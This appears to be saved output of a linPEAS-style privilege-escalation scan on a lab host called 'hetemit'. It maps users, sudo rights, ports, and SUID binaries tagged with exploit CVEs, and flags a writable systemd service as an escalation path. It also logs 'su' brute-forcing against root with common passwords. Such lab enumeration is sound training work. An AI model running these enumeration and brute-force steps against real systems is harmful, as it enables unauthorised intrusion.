+:1.5                                  895 NetworkManager  root             :1.5          NetworkManager.service    -          -
+:1.58                                1928 systemd-resolve systemd-resolve  :1.58         systemd-resolved.service  -          -
+com.redhat.ifcfgrh1                   895 NetworkManager  root             :1.12         NetworkManager.service    -          -
+com.redhat.tuned                      939 tuned           root             :1.19         tuned.service             -          -
+org.freedesktop.DBus                    1 systemd         root             -             init.scope                -          -
+org.freedesktop.NetworkManager        895 NetworkManager  root             :1.5          NetworkManager.service    -          -
+org.freedesktop.PolicyKit1            880 polkitd         polkitd          :1.4          polkit.service            -          -
+org.freedesktop.hostname1               - -               -                (activatable) -                         -
+org.freedesktop.locale1                 - -               -                (activatable) -                         -
+org.freedesktop.login1               1008 systemd-logind  root             :1.18         systemd-logind.service    -          -
+org.freedesktop.nm_dispatcher           - -               -                (activatable) -                         -
+org.freedesktop.portable1               - -               -                (activatable) -                         -
+org.freedesktop.realmd                  - -               -                (activatable) -                         -
+org.freedesktop.resolve1             1928 systemd-resolve systemd-resolve  :1.58         systemd-resolved.service  -          -
+org.freedesktop.systemd1                1 systemd         root             :1.1          init.scope                -          -
+org.freedesktop.timedate1               - -               -                (activatable) -                         -
+
+
+═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
+[+] Hostname, hosts and DNS
+hetemit
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+nameserver 192.168.197.254
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+default 0.0.0.0
+loopback 127.0.0.0
+link-local 169.254.0.0
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.197.117  netmask 255.255.255.0  broadcast 192.168.197.255
+        inet6 fe80::a4d8:8dd4:1173:46e1  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:bf:51:59  txqueuelen 1000  (Ethernet)
+        RX packets 13931856  bytes 1429915051 (1.3 GiB)
+        RX errors 0  dropped 10  overruns 0  frame 0
+        TX packets 13725944  bytes 3380888494 (3.1 GiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 9911  bytes 1261217 (1.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9911  bytes 1261217 (1.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         _gateway        0.0.0.0         UG    100    0        0 ens160
+192.168.197.0   0.0.0.0         255.255.255.0   U     100    0        0 ens160
+Address                  HWtype  HWaddress           Flags Mask            Iface
+_gateway                 ether   00:50:56:bf:33:bf   C                     ens160
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:18000           0.0.0.0:*               LISTEN      1396/puma 4.3.6 (tc
+tcp        0      0 0.0.0.0:50000           0.0.0.0:*               LISTEN      1400/python3.6
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::5355                 :::*                    LISTEN      -
+tcp6       0      0 :::139                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::445                  :::*                    LISTEN      -
+
+[+] Can I sniff with tcpdump?
+No
+
+[+] Internet Access?
+Ping is not available
+Port 443 is not accessible
+Port 80 is not accessible
+DNS not available
+
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
+
+[+] Do I have PGP keys?
+/usr/bin/gpg
+/home/cmeeks/.gnupg/pubring.kbx
+-------------------------------
+pub   rsa4096 2014-10-28 [SC]
+      409B6B1796C275462A1703113804BB82D39DC0E3
+uid           [ unknown] Michal Papis (RVM signing) <mpapis@gmail.com>
+uid           [ unknown] Michal Papis <michal.papis@toptal.com>
+uid           [ unknown] [jpeg image of size 5015]
+sub   rsa2048 2015-11-02 [E]
+sub   rsa4096 2014-10-28 [S] [expires: 2022-03-12]
+
+pub   rsa4096 2016-11-11 [SC]
+      7D2BAF1CF37B13E2069D6956105BD0E739499BDB
+uid           [ unknown] Piotr Kuczynski <piotr.kuczynski@gmail.com>
+sub   rsa4096 2016-11-11 [E]
+
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries for cmeeks on hetemit:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User cmeeks may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb wasn't found in PATH
+
+[+] Checking doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=193(systemd-resolve) gid=193(systemd-resolve) groups=193(systemd-resolve)
+uid=1(bin) gid=1(bin) groups=1(bin)
+uid=26(postgres) gid=26(postgres) groups=26(postgres)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m)
+uid=3(adm) gid=4(adm) groups=4(adm)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=59(tss) gid=59(tss) groups=59(tss)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=991(unbound) gid=987(unbound) groups=987(unbound)
+uid=992(rngd) gid=988(rngd) groups=988(rngd)
+uid=993(chrony) gid=989(chrony) groups=989(chrony)
+uid=994(sssd) gid=990(sssd) groups=990(sssd)
+uid=995(cockpit-wsinstance) gid=992(cockpit-wsinstance) groups=992(cockpit-wsinstance)
+uid=996(cockpit-ws) gid=993(cockpit-ws) groups=993(cockpit-ws)
+uid=997(libstoragemgmt) gid=995(libstoragemgmt) groups=995(libstoragemgmt)
+uid=998(polkitd) gid=996(polkitd) groups=996(polkitd)
+uid=999(systemd-coredump) gid=997(systemd-coredump) groups=997(systemd-coredump)
+
+[+] Login now
+ 05:55:22 up  4:23,  0 users,  load average: 0.23, 0.22, 0.34
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  Wed Mar 31 00:39:14 2021   still running                         0.0.0.0
+reboot   system boot  Wed Mar 10 18:53:21 2021   still running                         0.0.0.0
+reboot   system boot  Thu Dec 10 13:13:04 2020   still running                         0.0.0.0
+
+wtmp begins Thu Dec 10 13:13:04 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+
+[+] Password policy
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user cmeeks...
+  Bruteforcing user postgres...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+ Not Found
+
+[+] PostgreSQL version and pgadmin credentials
+Version: psql (PostgreSQL) 10.14
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.37 (centos)
+Server built:   Sep 15 2020 15:41:16
+PHP exec extensions
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Moodle config.php files
+config.php inside a moodle folder Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+mongo binary Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+ldap Not Found
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+auth       substack     password-auth
+auth       include      postlogin
+account    include      password-auth
+password   include      password-auth
+session    include      password-auth
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+-rw-r--r--. 1 root root 812 Apr 24  2020 /etc/krb5.conf
+    default_ccache_name = KEYRING:persistent:%{uid}
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+[+] Searching Keyring files
+
+[+] Searching Filezilla sites file
+
+[+] Searching backup-manager files
+
+[+] Searching uncommon passwd files (splunk)
+
+[+] Searching GitLab related files
+
+
+[+] Searching PGP/GPG
+PGP/GPG software:
+/usr/bin/gpg
+/home/cmeeks/.gnupg/pubring.kbx
+-------------------------------
+pub   rsa4096 2014-10-28 [SC]
+      409B6B1796C275462A1703113804BB82D39DC0E3
+uid           [ unknown] Michal Papis (RVM signing) <mpapis@gmail.com>
+uid           [ unknown] Michal Papis <michal.papis@toptal.com>
+uid           [ unknown] [jpeg image of size 5015]
+sub   rsa2048 2015-11-02 [E]
+sub   rsa4096 2014-10-28 [S] [expires: 2022-03-12]
+
+pub   rsa4096 2016-11-11 [SC]
+      7D2BAF1CF37B13E2069D6956105BD0E739499BDB
+uid           [ unknown] Piotr Kuczynski <piotr.kuczynski@gmail.com>
+sub   rsa4096 2016-11-11 [E]
+
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Searching vim files
+
+[+] Checking if containerd(ctr) is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
+
+[+] Checking if runc is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+
+[+] Searching docker files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
+
+[+] Interesting Firefox Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Interesting Chrome Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Autologin Files
+
+[+] S/Key authentication
+
+[+] YubiKey authentication
+
+[+] Passwords inside pam.d
+
+[+] FastCGI Params
+
+[+] SNMPs
+
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-x. 1 root root                61K May 11  2019 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x. 1 root root                38K May 11  2019 /usr/bin/fusermount
+-rwsr-xr-x. 1 root root                65K Nov  8  2019 /usr/bin/crontab
+-rwsr-xr-x. 1 root root                87K Nov  8  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x. 1 root root               154K Nov  8  2019 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root               131K Nov  8  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root                33K Apr  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x. 1 root root                29K Apr  9  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-xr-x. 1 root root                35K Apr  9  2020 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x. 1 root root                49K Apr 15  2020 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root                15K Apr 15  2020 /usr/sbin/pam_timestamp_check
+---s--x--x. 1 root root               162K Apr 24  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-x---. 1 root cockpit-wsinstance  46K Apr 24  2020 /usr/libexec/cockpit-session (Unknown SUID binary)
+-rwsr-x---. 1 root sssd                55K Apr 24  2020 /usr/libexec/sssd/selinux_child (Unknown SUID binary)
+-rwsr-x---. 1 root sssd                29K Apr 24  2020 /usr/libexec/sssd/proxy_child (Unknown SUID binary)
+-rwsr-x---. 1 root sssd                92K Apr 24  2020 /usr/libexec/sssd/ldap_child (Unknown SUID binary)
+-rwsr-x---. 1 root sssd               161K Apr 24  2020 /usr/libexec/sssd/krb5_child (Unknown SUID binary)
+-rwsr-xr-x. 1 root root                33K Apr 24  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x. 1 root root                50K Apr 24  2020 /usr/bin/su
+-rwsr-xr-x. 1 root root                50K Apr 24  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rws--x--x. 1 root root                25K Apr 24  2020 /usr/bin/chsh
+-rws--x--x. 1 root root                34K Apr 24  2020 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-x---. 1 root dbus                63K Jul 21  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+-rwsr-xr-x. 1 root root                12K Jul 28  2020 /usr/sbin/grub2-set-bootflag (Unknown SUID binary)
+----------------------------------------------------------------------------------------
+  --- Trying to execute /usr/sbin/grub2-set-bootflag with strace in order to look for hijackable libraries...
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+openat(AT_FDCWD, "/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+----------------------------------------------------------------------------------------
+
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwx--s--x. 1 root utmp      14K May 11  2019 /usr/libexec/utempter/utempter
+-rwx--s--x. 1 root slocate   48K May 11  2019 /usr/bin/locate
+-r-xr-sr-x. 1 root ssh_keys 616K Feb  4  2020 /usr/libexec/openssh/ssh-keysign
+-rwxr-sr-x. 1 root tty       21K Apr 24  2020 /usr/bin/write
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include ld.so.conf.d/*.conf
+ld.so.conf.d
+  ld.so.conf.d/*
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+Current: =
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/mtr-packet = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs (limited to 50)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/lesspipe.sh
+/usr/bin/gettext.sh
+/usr/bin/rescan-scsi-bus.sh
+
+[+] Unexpected in root
+/.autorelabel
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 92
+drwxr-xr-x.  2 root root 4096 Nov 13  2020 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+-rw-r--r--.  1 root root  664 May 11  2019 bash_completion.sh
+-rw-r--r--.  1 root root  196 May 11  2019 colorgrep.csh
+-rw-r--r--.  1 root root  201 May 11  2019 colorgrep.sh
+-rw-r--r--.  1 root root 1741 Jun 10  2020 colorls.csh
+-rw-r--r--.  1 root root 1606 Jun 10  2020 colorls.sh
+-rw-r--r--.  1 root root  162 May 11  2019 colorxzgrep.csh
+-rw-r--r--.  1 root root  183 May 11  2019 colorxzgrep.sh
+-rw-r--r--.  1 root root  216 Nov  8  2019 colorzgrep.csh
+-rw-r--r--.  1 root root  220 Nov  8  2019 colorzgrep.sh
+-rw-r--r--.  1 root root   80 Apr  6  2020 csh.local
+-rw-r--r--.  1 root root 1107 Dec 14  2017 gawk.csh
+-rw-r--r--.  1 root root  757 Dec 14  2017 gawk.sh
+-rw-r--r--.  1 root root 2486 Apr  6  2020 lang.csh
+-rw-r--r--.  1 root root 2312 Apr  6  2020 lang.sh
+-rw-r--r--.  1 root root  500 May 11  2019 less.csh
+-rw-r--r--.  1 root root  253 May 11  2019 less.sh
+-rw-r--r--.  1 root root   81 Apr  6  2020 sh.local
+-rw-r--r--.  1 root root  120 Apr  7  2020 which2.csh
+-rw-r--r--.  1 root root  333 Apr  7  2020 which2.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+You have write privileges over /etc/systemd/system/pythonapp.service
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home/
+/home/cmeeks/local.txt
+/home/cmeeks/share
+/root/
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/vmware-vgauthsvc.log.0
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.log
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.librepo.log
+/var/tmp/dnf-cmeeks-yuobhckl/dnf.rpm.log
+/var/tmp/dnf-cmeeks-yuobhckl/expired_repos.json
+/var/tmp/dnf-cmeeks-yuobhckl/hawkey.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/logrotate.status
+    ACL support:                yes
+    SELinux support:            yes
+Writable: /var/tmp/dnf-cmeeks-yuobhckl/dnf.log
+Writable: /var/tmp/dnf-cmeeks-yuobhckl/dnf.librepo.log
+Writable: /var/tmp/dnf-cmeeks-yuobhckl/dnf.rpm.log
+Writable: /home/cmeeks/.rvm/log/1605299759_ruby-2.7.0/package_install_patch_autoconf_automake_bison_gcc-c++_libffi-devel_libtool_patch_readline-devel_ruby_sqlite-devel_zlib-devel_openssl-devel.log
+Writable: /home/cmeeks/.rvm/log/1605299828_ruby-2.7.0/gemsets.import.global.log
+Writable: /home/cmeeks/.rvm/log/1605299828_ruby-2.7.0/gemset.wrappers.global.log
+Writable: /home/cmeeks/.rvm/log/1605299828_ruby-2.7.0/gemset.wrappers.default.log
+Writable: /home/cmeeks/.rvm/log/1605299829_ruby-2.7.0/alias_create.log
+Writable: /home/cmeeks/.rvm/log/1605299974_ruby-2.6.3/gemsets.import.global.log
+Writable: /home/cmeeks/.rvm/log/1605299974_ruby-2.6.3/gemset.wrappers.global.log
+Writable: /home/cmeeks/.rvm/log/1605299974_ruby-2.6.3/gemset.wrappers.default.log
+Writable: /home/cmeeks/.rvm/log/1605299975_ruby-2.6.3/alias_delete.log
+Writable: /home/cmeeks/.rvm/log/1605299975_ruby-2.6.3/alias_create.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.7.0/extensions/x86_64-linux/2.7.0/nokogiri-1.10.10/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.7.0/extensions/x86_64-linux/2.7.0/nio4r-2.5.4/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/nokogiri-1.10.10/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/nio4r-2.5.4/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/msgpack-1.3.3/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/ffi-1.13.1/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/pg-1.2.3/mkmf.log
+Writable: /home/cmeeks/.rvm/gems/ruby-2.6.3/extensions/x86_64-linux/2.6.0/puma-4.3.6/mkmf.log
+Writable: /home/cmeeks/.cache/yarn/v6/npm-is-arrayish-0.3.2-4574a2ae56f7ab206896fb431eaeed066fdf8f03-integrity/node_modules/is-arrayish/yarn-error.log
+Writable: /home/cmeeks/.cache/yarn/v6/npm-sockjs-client-1.4.0-c9f2568e19c8fd8173b4997ea3420e0bb306c7d5-integrity/node_modules/sockjs-client/local.log
+Writable: /home/cmeeks/register_hetemit/log/development.log
+Writable: /home/cmeeks/register_hetemit/node_modules/simple-swizzle/node_modules/is-arrayish/yarn-error.log
+Writable: /home/cmeeks/register_hetemit/node_modules/sockjs-client/local.log
+
+[+] Files inside /home/cmeeks (limit 20)
+total 28
+drwx------. 12 cmeeks cmeeks  267 Jun 12 05:52 .
+drwxr-xr-x.  3 root   root     20 Nov 13  2020 ..
+-rw-------   1 cmeeks cmeeks    0 Nov 13  2020 .bash_history
+-rw-r--r--.  1 cmeeks cmeeks   18 Nov  8  2019 .bash_logout
+-rw-r--r--.  1 cmeeks cmeeks  141 Nov  8  2019 .bash_profile
+-rw-r--r--.  1 cmeeks cmeeks  373 Nov 13  2020 .bashrc
+drwxrwxr-x   3 cmeeks cmeeks   19 Nov 13  2020 .bundle
+drwx------   4 cmeeks cmeeks   29 Nov 13  2020 .cache
+drwxrwxr-x   3 cmeeks cmeeks   19 Nov 13  2020 .gem
+drwx------   4 cmeeks cmeeks  103 Nov 13  2020 .gnupg
+-rw-r--r--.  1 root   root     33 Jun 12 01:35 local.txt
+drwxr-xr-x  15 cmeeks cmeeks 4096 Nov 12  2020 register_hetemit
+drwxr-xr-x   3 cmeeks cmeeks   39 Nov 13  2020 restjson_hetemit
+drwxrwxr-x  25 cmeeks cmeeks 4096 Nov 13  2020 .rvm
+drwxr-xr-x   2 root   root      6 Nov 13  2020 share
+drwxrwxr-x   2 cmeeks cmeeks   57 Jun 12 05:54 tmp
+drwxrwxr-x   3 cmeeks cmeeks   17 Nov 13  2020 .yarn
+-rw-rw-r--   1 cmeeks cmeeks  116 Nov 13  2020 .yarnrc
+
+[+] Files inside others home (limit 20)
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+ 13475421      0 -rw-rw----   1  cmeeks   mail            0 Nov 13  2020 /var/mail/cmeeks
+ 13475421      0 -rw-rw----   1  cmeeks   mail            0 Nov 13  2020 /var/spool/mail/cmeeks
+
+[+] Backup folders
+drwx------. 2 root root 16 Nov 13  2020 /etc/lvm/backup
+
+[+] Backup files (limited 100)
+-rw-r--r--. 1 root root 2197 May  1  2020 /etc/nsswitch.conf.bak
+-rwxr-xr-x 1 root root 122400 Sep 15  2020 /usr/bin/pg_basebackup
+-rw-r--r--. 1 root root 2516 May  8  2020 /usr/lib/modules/4.18.0-193.el8.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
+-rw-r--r--. 1 root root 2516 Oct 22  2020 /usr/lib/modules/4.18.0-193.28.1.el8_2.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
+-rw-r--r-- 1 root root 7138 Mar 23  2020 /usr/lib/node_modules/npm/node_modules/form-data/README.md.bak
+-rwxr-xr-x. 1 root root 41696 Aug  6  2020 /usr/lib64/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r--. 1 root root 305 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_arp_ping_1.conf
+-rw-r--r--. 1 root root 465 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_arp_ping_2.conf
+-rw-r--r--. 1 root root 194 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_ethtool_1.conf
+-rw-r--r--. 1 root root 212 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_ethtool_2.conf
+-rw-r--r--. 1 root root 241 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_ethtool_3.conf
+-rw-r--r--. 1 root root 447 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_multi_lw_1.conf
+-rw-r--r--. 1 root root 285 Dec  9  2018 /usr/share/doc/teamd/example_configs/activebackup_nsna_ping_1.conf
